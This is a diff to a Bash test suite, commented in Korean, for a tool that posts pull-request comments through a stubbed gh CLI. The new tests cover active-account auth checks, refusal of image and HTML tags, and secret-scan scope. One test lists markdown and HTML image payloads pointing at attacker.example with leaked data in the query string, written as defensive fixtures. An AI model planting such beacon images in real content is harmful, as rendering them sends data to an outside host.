@@ -22,7 +22,10 @@ cat > "$T/bin/gh" <<'EOF'
 #!/usr/bin/env bash
 printf '%s\n' "$*" >> "$GH_LOG"
 case "$1 ${2:-}" in
-  "auth status") exit "${GH_AUTH_RC:-0}" ;;
+  "auth status")
+    # GH_OTHER_ACCOUNT_BROKEN=1 — 활성 계정 밖(다른 호스트·두 번째 계정)이 깨졌다. `--active` 없이 물으면 gh 는 1 을 낸다.
+    if [ "${GH_OTHER_ACCOUNT_BROKEN:-0}" = 1 ] && [ "${3:-}" != "--active" ]; then exit 1; fi
+    exit "${GH_AUTH_RC:-0}" ;;
   "pr view")
     case "${GH_PR:-none}" in
       none) echo 'no pull requests found for branch "feat"' >&2; exit 1 ;;
@@ -139,7 +142,10 @@ case_AC13_gh_unavailable() {
   fi
   GH_AUTH_RC=1 GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$BODY"
   assert_eq "$LAST" "skipped: gh-unavailable" "AC13 미인증: 마지막 줄"
-  assert_eq "$GHCALLS" "auth status" "P5: 미인증이면 auth 확인 뒤 gh 호출이 없다"
+  assert_eq "$GHCALLS" "auth status --active" "P5: 미인증이면 auth 확인 뒤 gh 호출이 없다"
+  # 활성 계정은 멀쩡하고 다른 계정만 깨졌으면 게시한다 — 인증 확인은 활성 계정만 본다(M3).
+  GH_OTHER_ACCOUNT_BROKEN=1 GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$BODY"
+  assert_eq "$LAST" "posted: https://github.com/o/r/pull/7#issuecomment-1" "M3: 다른 계정만 깨졌으면 게시한다(auth status --active)"
   GH_PR=error run_sink "$WITH_GH" --body-file "$BODY"
   assert_eq "$LAST" "skipped: gh-unavailable" "AC13 gh pr view 오류(no-pr 아님): 마지막 줄"
   GH_PR="$OPEN_PR" GH_COMMENT_RC=1 run_sink "$WITH_GH" --body-file "$BODY"
@@ -209,7 +215,7 @@ case_P5_auth_before_side_effects() {
   GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$BODY"
   local first_line
   first_line="$(printf '%s\n' "$GHCALLS" | head -n 1)"
-  assert_eq "$first_line" "auth status" "P5: 첫 gh 호출은 auth status"
+  assert_eq "$first_line" "auth status --active" "P5: 첫 gh 호출은 auth status --active"
 }
 
 # ── P4 · P7 — 본문·커밋 메시지·파일 이름은 데이터다 ─────────────────────────────
@@ -382,6 +388,53 @@ case_subdir_runs_from_repo_root() {
   rm -f "$REPO/rootsecret.env"; rmdir "$REPO/sub"
 }
 
+# ── I2 — 이미지 · HTML 태그는 게시하지 않는다(렌더링이 외부 URL 을 부른다) ──────────
+case_I2_images_and_html_refused() {
+  local img="$T/img.md" form i=0
+  for form in '![x](https://attacker.example/p.png?d=db-prod-internal)' '![x][ref]' \
+              '<img src="https://attacker.example/p.png">' '<IMG SRC=x>' '<picture>x</picture>' \
+              '<source srcset="https://attacker.example/p.png">' '<svg><image href="x"/></svg>' '<SvG>'; do
+    i=$((i + 1))
+    printf '## 한 줄\n본문 %s 끝.\n' "$form" > "$img"
+    GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$img"
+    assert_eq "$LAST" "skipped: scan-failed" "I2 형태 ${i}(${form}): scan-failed"
+    no_comment_call "I2 형태 ${i}"
+    grep -qF '본문에 이미지·HTML 태그가 있다' "$T/err" \
+      && ok "I2 형태 ${i}: stderr 가 이유를 밝힌다" || no "I2 형태 ${i}: stderr 에 이유가 없다 — $(head -n 3 "$T/err")"
+  done
+  # 길이 검사보다 앞이다 — 너무 긴 본문이라도 이미지가 있으면 scan-failed.
+  python3 -c 'import sys; open(sys.argv[1],"w",encoding="utf-8").write("가"*65537 + "\n<img src=x>\n")' "$img"
+  GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$img"
+  assert_eq "$LAST" "skipped: scan-failed" "I2: 이미지 검사는 길이 검사보다 먼저다"
+  # 대조군: 링크는 그대로 게시한다.
+  printf '## 한 줄\n자세한 것은 [설계](https://example.com/design) 와 <https://example.com/x> 참고.\n' > "$img"
+  GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$img"
+  assert_eq "$LAST" "posted: https://github.com/o/r/pull/7#issuecomment-1" "I2 대조군: 링크만 있는 본문은 게시"
+  # 검사 자체가 실패하면(grep rc 2) 통과로 읽지 않는다 — 같은 링크 본문이 scan-failed.
+  mkdir -p "$T/shim-grep"
+  printf '#!/usr/bin/env bash\nfor a in "$@"; do case "$a" in *"<(img"*) exit 2 ;; esac; done\nexec "%s" "$@"\n' "$(type -P grep)" > "$T/shim-grep/grep"
+  chmod +x "$T/shim-grep/grep"
+  GH_PR="$OPEN_PR" run_sink "$T/shim-grep:$WITH_GH" --body-file "$img"
+  assert_eq "$LAST" "skipped: scan-failed" "I2: 이미지 검사 실패(grep rc 2)는 fail-closed"
+  no_comment_call "I2 검사 실패"
+}
+
+# ── M4 — 게시 본문이 사는 세션 폴더는 corpus 밖이다(.claude/ 를 무시하지 않는 리포) ──────
+case_M4_session_dir_not_in_corpus() {
+  local tok="Rb5nX9vC3mZ7qL1kT4wY8uH2jG6dS0pF" sd="$REPO/.claude/quality-gates/sess-m4-0001"
+  mkdir -p "$sd"
+  printf '## 한 줄\n값 %s 이 바뀐다.\n\n---\nqg: clean · 막는 지적 0 · 선택 0 · 차등 새 실패 0 · 제외 패치 0 · iter 1 · abc1234\n' "$tok" > "$sd/comment.md"
+  printf 'intent %s\n' "$tok" > "$sd/intent.md"
+  git -C "$REPO" check-ignore -q "$sd/comment.md" && no "전제: 픽스처 리포가 세션 폴더를 무시한다" || ok "전제: 세션 폴더는 무시되지 않는 untracked 다"
+  GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$sd/comment.md"
+  assert_eq "$LAST" "posted: https://github.com/o/r/pull/7#issuecomment-1" "M4: 본문 자신과 세션 폴더 파일은 corpus 에 들지 않는다"
+  # 대조군: .claude/ 의 다른 untracked 파일은 여전히 corpus 다 — 빼는 범위는 세션 폴더뿐이다.
+  printf 'secret=%s\n' "$tok" > "$REPO/.claude/notes.env"
+  GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$sd/comment.md"
+  assert_eq "$LAST" "skipped: scan-failed" "M4 대조군: .claude/ 의 다른 untracked 파일은 corpus 에 든다"
+  rm -rf "$REPO/.claude"
+}
+
 # ── 잘못된 호출은 exit 2, 결과 줄 없음, gh 호출 0 ─────────────────────────────
 case_usage_errors() {
   run_sink "$WITH_GH"
@@ -405,7 +458,8 @@ for c in case_AC12_posts_one_new_comment case_AC13_no_pr case_AC13_pr_closed \
          case_P5_auth_before_side_effects case_P4_P7_untrusted_bytes case_I1_removed_content_in_corpus \
          case_I2_producer_failure_fails_closed case_subdir_runs_from_repo_root \
          case_N1_option_shaped_file_names case_N2_binary_attribute_hides_nothing \
-         case_T1_textconv_plaintext_in_corpus case_unreadable_changed_file_fails_closed case_usage_errors; do
+         case_T1_textconv_plaintext_in_corpus case_unreadable_changed_file_fails_closed \
+         case_I2_images_and_html_refused case_M4_session_dir_not_in_corpus case_usage_errors; do
   note "-- $c"
   "$c"
 done
